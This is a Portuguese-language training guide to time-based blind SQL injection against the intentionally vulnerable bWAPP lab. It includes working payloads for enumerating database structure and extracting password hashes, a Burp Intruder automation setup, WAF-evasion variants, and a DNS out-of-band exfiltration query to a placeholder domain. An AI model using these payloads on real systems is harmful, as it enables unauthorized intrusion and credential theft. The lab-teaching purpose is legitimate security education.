# SQL Injection Time-Based Blind
### Técnica avançada — Extração de dados pelo canal do tempo

> **Pré-requisito:** dominar boolean-based blind (ver `guia_sqli.md` seção 7.1). Time-based é o próximo passo quando nem mesmo o SIM/NÃO da resposta é discernível.

---

## Sumário

1. [O que é Time-Based Blind e quando usar](#1-o-que-é-time-based-blind-e-quando-usar)
2. [Funções de delay no MySQL/MariaDB](#2-funções-de-delay-no-mysqlmariadb)
3. [Anatomia do payload](#3-anatomia-do-payload)
4. [Calibragem — o passo que ninguém faz e deveria](#4-calibragem--o-passo-que-ninguém-faz-e-deveria)
5. [Detecção no sqli_15.php](#5-detecção-no-sqli_15php)
6. [Enumeração completa do information_schema](#6-enumeração-completa-do-information_schema)
7. [A armadilha do SLEEP em queries com LIKE](#7-a-armadilha-do-sleep-em-queries-com-like)
8. [Automação manual com Burp Intruder](#8-automação-manual-com-burp-intruder)
9. [Reduzindo o tempo total de extração](#9-reduzindo-o-tempo-total-de-extração)
10. [Variantes e fallbacks quando SLEEP não funciona](#10-variantes-e-fallbacks-quando-sleep-não-funciona)
11. [Falsos positivos e como lidar](#11-falsos-positivos-e-como-lidar)
12. [Cheatsheet final](#12-cheatsheet-final)

---

## 1. O que é Time-Based Blind e quando usar

### O problema que time-based resolve

Nas técnicas in-band (UNION, error-based) você lê dados diretamente na resposta HTTP. No boolean-based blind você explora uma diferença entre dois estados visíveis — "encontrou" vs. "não encontrou", `200 OK` vs. `500 Error`, body de 4.2KB vs. body de 3.8KB. Qualquer diferença mensurável já basta.

Mas existe um cenário pior: a aplicação mostra **a mesma resposta, independente do resultado da query**. Payload verdadeiro? Resposta X. Payload falso? Resposta X. Erro de sintaxe proposital? Ainda X.

É o que acontece em `/sqli_15.php` do bWAPP. A página envia um e-mail em silêncio e retorna uma mensagem genérica. Não tem reflexo de dados, não tem erro detalhado, não tem diferença de tamanho que você possa medir — para todos os efeitos práticos, a resposta é opaca.

É aí que entra o time-based blind: você **transforma o tempo de resposta em canal de informação**. Se a condição for verdadeira, o banco dorme alguns segundos antes de responder. Se for falsa, responde imediatamente. O relógio substitui os olhos.

### Quando usar (ordem de preferência)

| Técnica | Requisito |
|---------|-----------|
| UNION-based | Há reflexão dos dados da query no HTML |
| Error-based | Mensagens de erro SQL aparecem na resposta |
| Boolean-based blind | A resposta tem pelo menos **dois estados distinguíveis** |
| **Time-based blind** | **A resposta é idêntica em qualquer cenário** |
| Out-of-band (OOB) | Servidor consegue fazer DNS/HTTP de saída, útil quando tempo é instável |

Time-based é o **último recurso in-band**. Funciona em quase qualquer banco com suporte a funções de delay — mas é a técnica mais lenta de todas. Use quando nenhuma outra opção estiver disponível.

### Por que é mais lento?

Você extrai **um bit de informação por requisição**. Um caractere ASCII tem 7 bits úteis, o que significa, com busca binária, ~7 requisições por caractere. Uma senha SHA-1 tem 40 caracteres hexadecimais. Fazendo a conta rápida:

```
40 chars × 7 requisições × 5 segundos de SLEEP = ~23 minutos
```

Só para extrair uma senha. Para enumeração completa do banco (versão, nome do banco, tabelas, colunas, dados) você pode facilmente passar de uma hora de extração manual.

💡 **Perspectiva:** vale cada minuto quando é o único canal disponível. Mas seja estratégico — extraia só o que precisa.

---

## 2. Funções de delay no MySQL/MariaDB

### SLEEP(N)

A função padrão. Bloqueia a execução da query por exatamente N segundos (aceita frações: `SLEEP(1.5)`).

```sql
SELECT SLEEP(3);   -- retorna após ~3 segundos
```

É a escolha default porque é previsível, leve em CPU e bem suportada em qualquer versão do MySQL/MariaDB.

### BENCHMARK(N, expr)

Executa `expr` exatamente N vezes. O delay é baseado em ciclos de CPU, portanto **variável** — depende da carga do servidor.

```sql
SELECT BENCHMARK(5000000, SHA1('x'));
```

Em um servidor moderno, 5 milhões de SHA1 leva aproximadamente 2-4 segundos. Ajuste N conforme necessário.

⚠️ **BENCHMARK é menos confiável** do que SLEEP porque o delay varia conforme a carga do servidor. Use apenas quando `SLEEP` estiver bloqueado ou filtrado.

### RLIKE com regex catastrófica

Uma regex maliciosa pode consumir CPU exponencialmente (backtracking catastrófico):

```sql
SELECT '' RLIKE '(a+)+$'
```

Isso consome CPU em vez de esperar por I/O. É um truque de bypass para filtros de string que bloqueiam `SLEEP` e `BENCHMARK` como palavras-chave — mas altamente instável e não recomendado em produção.

### Tabela comparativa

| Função | Sintaxe | Tipo de delay | Quando preferir |
|--------|---------|---------------|-----------------|
| `SLEEP(N)` | `SLEEP(5)` | I/O bloqueante, preciso | Padrão — use sempre que possível |
| `BENCHMARK(N, expr)` | `BENCHMARK(5000000, SHA1('x'))` | CPU, variável | `SLEEP` filtrado como palavra-chave |
| `RLIKE` catastrófico | `'' RLIKE '(a+)+$'` | CPU, altamente instável | Último recurso em WAFs muito restritivos |

---

## 3. Anatomia do payload

O payload time-based é construído em torno de uma condicional `IF`:

```sql
<INPUT>' AND IF(<CONDIÇÃO>, SLEEP(N), 0) -- -
```

Decompondo cada parte:

| Parte | Papel |
|-------|-------|
| `<INPUT>'` | Fecha a string original da query |
| `AND` | Mantém a query válida; a condição é avaliada junto com o filtro original |
| `IF(<CONDIÇÃO>, SLEEP(N), 0)` | O coração do payload: se verdadeiro, dorme; senão, retorna 0 (neutro) |
| `-- -` | Comenta o resto da query original para não gerar erro de sintaxe |

### Como o banco interpreta

Suponha que a query original do servidor seja:

```sql
SELECT * FROM movies WHERE title = '<INPUT>'
```

Após a injeção de `Iron Man' AND IF(1=1, SLEEP(5), 0) -- -`, ela vira:

```sql
SELECT * FROM movies WHERE title = 'Iron Man' AND IF(1=1, SLEEP(5), 0) -- -'
```

O banco avalia: `title = 'Iron Man'` (provavelmente verdadeiro) **E** `IF(1=1, SLEEP(5), 0)`. Como `1=1` é verdade, chama `SLEEP(5)`. A requisição volta depois de ~5 segundos.

Com `IF(1=2, SLEEP(5), 0)`, a condição é falsa, retorna `0` imediatamente — resposta volta em tempo normal.

### O canal de informação

```
Resposta demorou ~5s  →  SIM  →  a condição é verdadeira
Resposta voltou em <1s  →  NÃO  →  a condição é falsa
```

Esse é o alfabeto inteiro da técnica. Tudo que você vai extrair é construído com sequências de SIM e NÃO.

---

## 4. Calibragem — o passo que ninguém faz e deveria

Antes de disparar qualquer payload de extração, você precisa entender o "ruído" do canal. Se a rede ou o servidor já são lentos e variáveis, você pode confundir latência real com SLEEP.

### Passo 1: medir o baseline

No Burp Repeater, mande **5 requisições normais** (sem injeção, com um title válido como `Iron Man`) e anote o tempo de cada resposta:

```
Req 1: 187ms
Req 2: 203ms
Req 3: 195ms
Req 4: 212ms
Req 5: 191ms
Média: ~198ms    Desvio: ~10ms
```

### Passo 2: validar SLEEP funciona

Mande o payload mais simples possível — SLEEP incondicional, sem busca de dados:

```
Iron Man' AND SLEEP(5) -- -
```

Resultado esperado: resposta em ~5200ms (5000ms de SLEEP + ~200ms de baseline). Se chegou próximo disso, o canal é funcional.

Se demorou 10s, a query deve ter retornado mais de uma linha (o SLEEP foi avaliado para cada linha — veja Seção 7). Se voltou em <1s, verifique se o payload está sintaticamente correto.

### Passo 3: validar o condicional

Confirme que você controla o delay com a condicional:

```
Iron Man' AND IF(1=1, SLEEP(5), 0) -- -    → deve demorar ~5s  (SIM)
Iron Man' AND IF(1=2, SLEEP(5), 0) -- -    → deve ser rápido    (NÃO)
```

Diferença clara entre os dois? Canal calibrado. Pode prosseguir.

### Regra prática para escolher N no SLEEP

```
N  >=  3 × desvio padrão do baseline
```

Se o baseline tem desvio de 50ms (rede estável, local), `SLEEP(1)` já basta. Se o desvio for de 800ms (VPN instável, ambiente cloud), use `SLEEP(5)` ou `SLEEP(10)`. A margem precisa ser inequívoca — não existe leitura parcial aqui.

---

## 5. Detecção no sqli_15.php

### Sobre o alvo

`/sqli_15.php` implementa uma funcionalidade de "notificação por e-mail quando um filme for encontrado". A query real no servidor (`bWAPP/sqli_15.php:65`):

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

No nível `low`, `sqli()` mapeia para `no_check()` — input vai direto para a query. A resposta para o usuário é sempre uma mensagem genérica: nunca há reflexo de dados, nunca há detalhe de erro. Perfeito para time-based.

### Fluxo de detecção

**Passo 1** — Capture a requisição no Burp:

```
POST /sqli_15.php HTTP/1.1
...
title=Iron+Man&action=search
```

Mande pro Repeater (`Ctrl+R`).

**Passo 2** — Anote o tempo de resposta com input legítimo:

```
title=Iron Man
→ Resposta: 189ms
```

**Passo 3** — Teste de SLEEP incondicional:

```
title=Iron Man' AND SLEEP(5) -- -
→ Resposta: ~5200ms  ✅ SLEEP funcionou
```

**Passo 4** — Valide o controle condicional:

```
Iron Man' AND IF(1=1, SLEEP(5), 0) -- -   → ~5s   ✅ SIM
Iron Man' AND IF(1=2, SLEEP(5), 0) -- -   → ~200ms ✅ NÃO
```

🎯 **SQLi time-based confirmada.** Você tem controle condicional sobre o tempo de resposta.

---

## 6. Enumeração completa do information_schema

A partir daqui, toda extração segue o mesmo padrão:

1. Formule uma **pergunta binária** sobre um dado (ex: "o primeiro byte da versão é '1'?")
2. Codifique como `IF(<pergunta>, SLEEP(5), 0)`
3. Meça o tempo de resposta
4. Acumule os caracteres confirmados

Todos os payloads abaixo usam `Iron Man` como anchor (título que existe no banco, garantindo `WHERE title = 'Iron Man'` verdadeiro, o que mantém o `AND` sendo avaliado). Em tempo de ~5s = SIM, <500ms = NÃO.

---

### 6.1 Versão do banco

**Pergunta:** o banco é MariaDB 10.x?

```
Iron Man' AND IF(SUBSTRING(@@version,1,2)='10', SLEEP(5), 0) -- -
```

- ~5s → SIM, é MariaDB 10.x (confirma o ambiente)
- rápido → não começa com "10" — tente `'5.'` para MySQL 5.x

**Refinando:** qual o terceiro dígito?

```
Iron Man' AND IF(SUBSTRING(@@version,4,1)='6', SLEEP(5), 0) -- -
```

🎯 Resultado esperado: `10.6` (MariaDB 10.6, conforme docker-compose).

---

### 6.2 Tamanho do nome do banco atual

Antes de extrair letra por letra, descubra o tamanho — isso define quantas iterações você vai precisar.

**Busca direta por tamanho:**

```
Iron Man' AND IF(LENGTH(database())=5, SLEEP(5), 0) -- -
```

- ~5s → banco tem exatamente 5 caracteres (`bWAPP` tem 5)

**Se não souber de antemão, faça busca binária por tamanho:**

```
Iron Man' AND IF(LENGTH(database())>3, SLEEP(5), 0) -- -   → SIM (>3)
Iron Man' AND IF(LENGTH(database())>6, SLEEP(5), 0) -- -   → NÃO (não >6)
Iron Man' AND IF(LENGTH(database())>4, SLEEP(5), 0) -- -   → SIM (>4)
Iron Man' AND IF(LENGTH(database())=5, SLEEP(5), 0) -- -   → SIM ✅  tamanho=5
```

4 requisições para descobrir o tamanho.

---

### 6.3 Extração caractere a caractere de `database()`

Sabendo que o banco tem 5 caracteres, extraia um a um usando `SUBSTRING(database(), POS, 1)` e comparando o valor ASCII com `ASCII()`.

**Posição 1:**

```
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1))=98, SLEEP(5), 0) -- -
```

- ~5s → primeiro char é ASCII 98 = `b` ✅

Se não soubesse, usaria busca binária:

```
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1))>96, SLEEP(5), 0) -- -   → SIM
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0) -- -  → NÃO
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1))>98, SLEEP(5), 0) -- -   → NÃO
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1))=98, SLEEP(5), 0) -- -   → SIM ✅ = 'b'
```

**Posição 2 (esperada `W` = ASCII 87):**

```
Iron Man' AND IF(ASCII(SUBSTRING(database(),2,1))=87, SLEEP(5), 0) -- -
```

Repita para posições 3 (`A`=65), 4 (`P`=80), 5 (`P`=80).

Resultado reconstruído: `b` + `W` + `A` + `P` + `P` = **`bWAPP`** ✅

---

### 6.4 Contagem de tabelas no banco atual

```
Iron Man' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=7, SLEEP(5), 0) -- -
```

- ~5s → banco tem 7 tabelas

💡 Se não souber, faça busca binária com `>`:

```
Iron Man' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, SLEEP(5), 0) -- -
```

---

### 6.5 Nome de tabela por índice (LIMIT N,1)

Para extrair o nome da primeira tabela (índice 0), letra por letra:

**Primeiro caractere da primeira tabela:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=104, SLEEP(5), 0) -- -
```

- ASCII 104 = `h`
- ~5s → primeira tabela começa com `h` (provavelmente `heroes`) ✅

**Segundo caractere:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1))=101, SLEEP(5), 0) -- -
```

- ASCII 101 = `e` ✅

Continue até reconstruir o nome completo.

**Para a segunda tabela (índice 1), troque `LIMIT 0,1` por `LIMIT 1,1`:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1))=X, SLEEP(5), 0) -- -
```

🎯 Tabelas esperadas no bWAPP: `heroes`, `movies`, `users`, `blog`, `visitors`, `heroes_tbv`, `movies_genres` (a ordem pode variar por MariaDB).

---

### 6.6 Colunas da tabela `users`

Após confirmar que `users` existe, enumere suas colunas:

**Primeira coluna:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),1,1))=105, SLEEP(5), 0) -- -
```

- ASCII 105 = `i`
- ~5s → primeira coluna começa com `i` (provavelmente `id`) ✅

**Para encontrar `login` (geralmente segunda coluna, índice 1):**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1,1),1,1))=108, SLEEP(5), 0) -- -
```

- ASCII 108 = `l` ✅ (`login`)

**Para encontrar `password` (terceira coluna, índice 2):**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 2,1),1,1))=112, SLEEP(5), 0) -- -
```

- ASCII 112 = `p` ✅ (`password`)

---

### 6.7 Extraindo a senha do primeiro usuário

Sabendo que existe a coluna `password` na tabela `users`, extraia o hash SHA-1 (40 caracteres hexadecimais).

**Primeiro byte do hash do usuário na posição 0:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))=54, SLEEP(5), 0) -- -
```

- ASCII 54 = `6`
- ~5s → hash começa com `6` ✅ (consistente com SHA-1 conhecido do bWAPP)

Continue para as posições 2 a 40. São 40 × ~7 requisições ≈ 280 requisições apenas para uma senha. Use o Intruder para isso (Seção 8).

**Verificação de sanidade:** o hash SHA-1 do bWAPP para `bee:bug` é `6885858486f31043e5839c735d99457f045affd0`. Se o primeiro caractere extraído for `6` e o segundo `8`, você está no caminho certo.

---

## 7. A armadilha do SLEEP em queries com LIKE

Esta seção trata de uma armadilha clássica que **multiplica o tempo de SLEEP pelo número de linhas retornadas**. Todo aluno que vai de `sqli_15.php` para `sqli_1.php` sem ler isso aprende da pior forma.

### O problema

A query em `sqli_1.php` é:

```sql
SELECT * FROM movies WHERE title LIKE '%<INPUT>%'
```

Se você injetar `' OR IF(1=1, SLEEP(3), 0) OR '`:

```sql
SELECT * FROM movies WHERE title LIKE '%' OR IF(1=1, SLEEP(3), 0) OR '%'
```

O `LIKE '%'` casa com **todas as linhas da tabela**. O banco então avalia `IF(1=1, SLEEP(3), 0)` para cada linha retornada. Se `movies` tem 10 filmes → 30 segundos. Se tiver 50 → 150 segundos. **Por uma única requisição.**

🚨 Isso não é exploração — é um DoS acidental no laboratório (e um alerta enorme em ambientes reais com tabelas grandes).

### Como identificar que você caiu na armadilha

Se o SLEEP demora muito mais do que o N que você configurou (ex: você botou `SLEEP(3)` e a resposta veio em 90 segundos), você está avaliando múltiplas linhas.

### Solução 1: subquery escalar (avalia exatamente 1 vez)

Envolva a condição em uma subquery que retorna um único valor escalar. O `IF` externo então é avaliado apenas uma vez, independente de quantas linhas a query principal retornar:

```
' AND IF((SELECT SUBSTRING(database(),1,1))='b', SLEEP(5), 0) -- -
```

A subquery `(SELECT SUBSTRING(database(),1,1))` retorna um escalar — o `IF` é chamado uma vez. Forma segura e universal.

Outra forma equivalente:

```
' AND IF((SELECT IF(SUBSTRING(database(),1,1)='b', 1, 0))=1, SLEEP(5), 0) -- -
```

### Solução 2: forçar resultado de 0 ou 1 linha via anchor

Se você ancorizar o payload em um título que exista (exatamente uma linha):

```
Iron Man' AND IF(SUBSTRING(database(),1,1)='b', SLEEP(5), 0) -- -
```

`WHERE title = 'Iron Man'` retorna exatamente 1 linha (ou 0 se não existir). Com 1 linha, o SLEEP é avaliado 1 vez. ✅

Isso é exatamente por que `sqli_15.php` (que usa `=` em vez de `LIKE`) é mais seguro para demonstração: você ainda controla a âncora.

### Solução 3: forçar LIMIT 1 explicitamente

Em queries onde você não controla o anchor:

```
' UNION SELECT IF(SUBSTRING(database(),1,1)='b', SLEEP(5), 0) FROM dual LIMIT 1 -- -
```

`FROM dual` é uma tabela virtual com uma linha, então o IF é avaliado uma única vez. Requer que UNION seja possível — o que provavelmente não é (senão você não estaria em time-based), mas é uma opção teórica.

### Resumo da decisão

```
Query usa WHERE col = 'valor'  →  SLEEP direto é seguro (0 ou 1 linha)
Query usa WHERE col LIKE '%x%' →  SEMPRE use subquery escalar
```

---

## 8. Automação manual com Burp Intruder

Extrair 40 caracteres de SHA-1 manualmente é inviável. O Burp Intruder consegue fazer isso de forma semi-automatizada, ainda dentro do escopo de "sem SQLMap".

### Configuração para extração por busca binária

**Objetivo:** extrair a senha do primeiro usuário, posição por posição, usando comparação `>` (busca binária em ASCII).

**Payload base:**

```
Iron Man' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),§POS§,1))>§VAL§, SLEEP(5), 0) -- -
```

**Passo 1 — Send to Intruder:**

No Repeater, clique direito na requisição → Send to Intruder (`Ctrl+I`).

**Passo 2 — Configurar positions:**

Na aba Positions:
- Attack type: **Cluster Bomb**
- Marque `§POS§` como Position 1
- Marque `§VAL§` como Position 2

**Passo 3 — Configurar payloads:**

- Payload set 1 (posições 1-40): `Numbers`, from 1 to 40, step 1
- Payload set 2 (valores ASCII): `Numbers`, from 32 to 126, step 1

**Passo 4 — Configurações críticas:**

Em `Settings` (ou `Options`):
- `Request timeout`: **60000ms** (60s) — impede que requisições com SLEEP sejam abandonadas prematuramente
- Em `Resource Pool`: crie um pool com **1 thread** (concorrência 1)

⚠️ **Por que 1 thread?** Com múltiplas threads simultâneas, o banco pode enfileirar os SLEEPs — duas requisições ao mesmo tempo ambas dormindo 5s podem ser 5s ou 10s dependendo do isolamento de transação. Uma thread garante que você mede tempos independentes.

**Passo 5 — Interpretar resultados:**

Após o ataque:
- Clique no header da coluna **Response received** (tempo de chegada da resposta) para ordenar
- Requisições com tempo >= 5000ms são os "SIM" — a condição é verdadeira
- Para cada posição, pegue o **maior valor de VAL onde o tempo foi >= 5s** — esse é o limite inferior. O caractere real é `maior_VAL_que_foi_SIM + 1`

💡 Se usou comparação `=` em vez de `>`, procure as requisições lentas diretamente — cada uma corresponde ao caractere exato de cada posição.

---

## 9. Reduzindo o tempo total de extração

### Busca binária em ASCII: de 95 para 7 requisições por caractere

Em vez de testar cada valor de ASCII de 32 a 126 (95 possibilidades), use busca binária:

```
Intervalo inicial: [32, 126]
→ Teste >79 (meio): SIM → intervalo [80, 126]
→ Teste >103: NÃO → intervalo [80, 103]
→ Teste >91: SIM → intervalo [92, 103]
→ Teste >97: NÃO → intervalo [92, 97]
→ Teste >94: NÃO → intervalo [92, 94]
→ Teste >93: NÃO → intervalo [92, 93]
→ Teste =98: SIM ✅  → 'b'
```

7 requisições no pior caso em vez de 95. Para 40 chars de SHA-1: 280 requisições em vez de 3800.

### Busca por grupo com RLIKE

Você pode dividir o espaço de busca em metades usando expressões regulares:

```
Iron Man' AND IF(SUBSTRING(database(),1,1) RLIKE '^[a-m]', SLEEP(5), 0) -- -
```

- SIM → o char está entre `a` e `m` → próximo teste restringe mais
- NÃO → está entre `n` e `z` (ou fora desse range)

```
Iron Man' AND IF(SUBSTRING(database(),1,1) RLIKE '^[a-g]', SLEEP(5), 0) -- -
```

Cada teste elimina metade do espaço, semelhante à busca binária numérica mas usando regex. Útil quando você prefere trabalhar com caracteres diretamente em vez de códigos ASCII.

### Comparação de abordagens

| Estratégia | Requisições/char | Tempo/char (5s SLEEP) |
|------------|-----------------|----------------------|
| Linear (ASCII 32-126) | até 95 | até 475s (~8min) |
| Busca binária (ASCII numérico) | ~7 | ~35s |
| RLIKE por grupos | ~7 | ~35s |
| Boolean-based blind (sem SLEEP) | ~7 | ~0.1s |

A diferença entre time-based e boolean-based blind em velocidade é de **~350×**. Use time-based só quando boolean-based for impossível.

---

## 10. Variantes e fallbacks quando SLEEP não funciona

### Cenário 1: SLEEP filtrado como palavra-chave

Alguns WAFs bloqueiam a string `SLEEP` literalmente. Tente:

- Variação de case: `SleEp(5)` — funciona se o filtro for case-sensitive
- Comentário no meio: `SL/**/EEP(5)` — funciona se o filtro não normalizar
- Usar BENCHMARK como fallback: `BENCHMARK(5000000, SHA1('x'))`

```
Iron Man' AND IF(1=1, BENCHMARK(5000000, SHA1('x')), 0) -- -
```

Calibre o N do BENCHMARK no seu ambiente específico antes de usar em extração real.

### Cenário 2: Stacked queries (quando SLEEP dentro de SELECT falha)

Alguns conectores ou configurações bloqueiam funções de delay dentro de `SELECT` mas permitem stacked queries (múltiplas statements separadas por `;`):

```
Iron Man'; SELECT SLEEP(5) -- -
```

⚠️ `mysqli_query()` do PHP **não suporta stacked queries** por padrão — essa variante raramente funciona no bWAPP ou em apps PHP típicas. PDO com `PDO::MYSQL_ATTR_MULTI_STATEMENTS` habilitado é o raro caso onde funciona. Documente se testar mas não espere resultado aqui.

### Cenário 3: Delay via DNS (Out-of-band)

Quando o servidor tem resolução DNS de saída e a aplicação é muito restritiva:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', database(), '.seudominio.com\\share'))
```

Requer `FILE` privilege e `secure_file_priv` não restritivo — raramente disponível. Fora do escopo time-based mas vale conhecer como alternativa OOB.

---

## 11. Falsos positivos e como lidar

Time-based é sensível a ruído de rede e do servidor. Algumas fontes comuns de falsos positivos:

### Falso positivo: delay de rede ou servidor

O servidor Docker pode congelar brevemente por I/O, garbage collector do PHP, ou contenção de CPU se você tem outras cargas rodando. Uma requisição "sem SLEEP" que demora 4.5s parece um SIM quando não é.

**Defesa:** rode cada payload importante **3 vezes** e use a **mediana**. Uma lentidão isolada (1 em 3) é ruído; três lentas seguidas são sinal.

### Falso positivo: DNS lookup reverso

Algumas configurações de Apache fazem lookup DNS reverso do IP do cliente em cada requisição. Se o servidor de DNS estiver lento, pode adicionar segundos ao baseline de forma não determinística.

**Defesa:** compare o baseline com e sem SLEEP várias vezes. Se o baseline for irregular (variância > 1s), ajuste o SLEEP para 10s ou mais.

### Falso positivo: timeout de conexão do Burp

O Burp por padrão fecha conexões após alguns segundos. Se o SLEEP for maior que o timeout configurado, a requisição é abortada e você lê "resposta rápida" quando na verdade era um SIM que não completou.

**Defesa:** em `Settings → Network → Connections → Timeouts`, aumente `Normal` e `Redirect` para 60+ segundos.

### Protocolo geral para medições confiáveis

```
1. Meça baseline (5 requisições, sem payload)
2. Meça SLEEP(N) incondicional (3 requisições, deve ser consistente)
3. N deve ser >= 3× o desvio padrão do baseline
4. Para cada payload de extração: execute 3× e use a mediana
5. Se variância é alta: aumente N ou investigue a fonte do ruído
```

---

## 12. Cheatsheet final

### Detecção

```sql
-- SLEEP incondicional (confirma que delay funciona)
Iron Man' AND SLEEP(5) -- -

-- Condicional verdadeiro (deve ser lento)
Iron Man' AND IF(1=1, SLEEP(5), 0) -- -

-- Condicional falso (deve ser rápido)
Iron Man' AND IF(1=2, SLEEP(5), 0) -- -
```

### Reconhecimento básico

```sql
-- Versão do banco
Iron Man' AND IF(SUBSTRING(@@version,1,2)='10', SLEEP(5), 0) -- -

-- Tamanho do banco atual
Iron Man' AND IF(LENGTH(database())=5, SLEEP(5), 0) -- -

-- Usuário do banco
Iron Man' AND IF(SUBSTRING(user(),1,4)='root', SLEEP(5), 0) -- -
```

### Extração caractere a caractere

```sql
-- Padrão: posição POS, valor ASCII CODE
Iron Man' AND IF(ASCII(SUBSTRING(database(),POS,1))=CODE, SLEEP(5), 0) -- -

-- Busca binária com >
Iron Man' AND IF(ASCII(SUBSTRING(database(),POS,1))>VAL, SLEEP(5), 0) -- -

-- RLIKE por grupo (a-m)
Iron Man' AND IF(SUBSTRING(database(),POS,1) RLIKE '^[a-m]', SLEEP(5), 0) -- -
```

### Enumeração do information_schema

```sql
-- Contagem de tabelas
Iron Man' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=N, SLEEP(5), 0) -- -

-- Primeiro char do nome da Nth tabela (LIMIT N-1,1)
Iron Man' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),POS,1))=CODE, SLEEP(5), 0) -- -

-- Primeiro char do nome da Nth coluna de 'users'
Iron Man' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),POS,1))=CODE, SLEEP(5), 0) -- -
```

### Extração de dados

```sql
-- Senha do primeiro usuário
Iron Man' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),POS,1))=CODE, SLEEP(5), 0) -- -

-- Login do primeiro usuário
Iron Man' AND IF(ASCII(SUBSTRING((SELECT login FROM users LIMIT 0,1),POS,1))=CODE, SLEEP(5), 0) -- -
```

### Anti-pegadinha do LIKE (subquery escalar)

```sql
-- SEMPRE use esta forma quando a query usa LIKE ou pode retornar múltiplas linhas
' AND IF((SELECT SUBSTRING(database(),POS,1))='X', SLEEP(5), 0) -- -

' AND IF((SELECT ASCII(SUBSTRING(database(),POS,1)))>VAL, SLEEP(5), 0) -- -
```

### Fallback quando SLEEP é filtrado

```sql
-- BENCHMARK (ajuste N conforme carga do servidor)
Iron Man' AND IF(1=1, BENCHMARK(5000000, SHA1('x')), 0) -- -

-- BENCHMARK com condicional real
Iron Man' AND IF(SUBSTRING(database(),1,1)='b', BENCHMARK(5000000, SHA1('x')), 0) -- -
```

---

## Referência rápida de ASCII úteis

| Char | ASCII | Char | ASCII | Char | ASCII |
|------|-------|------|-------|------|-------|
| `0-9` | 48-57 | `A-Z` | 65-90 | `a-z` | 97-122 |
| `b` | 98 | `W` | 87 | `A` | 65 |
| `P` | 80 | `h` | 104 | `i` | 105 |
| `l` | 108 | `p` | 112 | `6` | 54 |

SHA-1 usa apenas `[0-9a-f]` — ASCII 48-57 e 97-102. Ao extrair hashes, restrinja o espaço de busca a esse range para economizar requisições.

---

> ⚠️ **Lembre-se:** time-based é lento por design. A paciência e a organização dos dados coletados são tão importantes quanto os payloads em si. Documente cada caractere confirmado conforme extrai — você não vai querer refazer.
>
> 🛡️ **Ética e legalidade:** esta técnica, como toda SQLi, só deve ser praticada em ambientes autorizados e controlados como este laboratório bWAPP. Em sistemas reais, a exploração sem autorização expressa é crime.
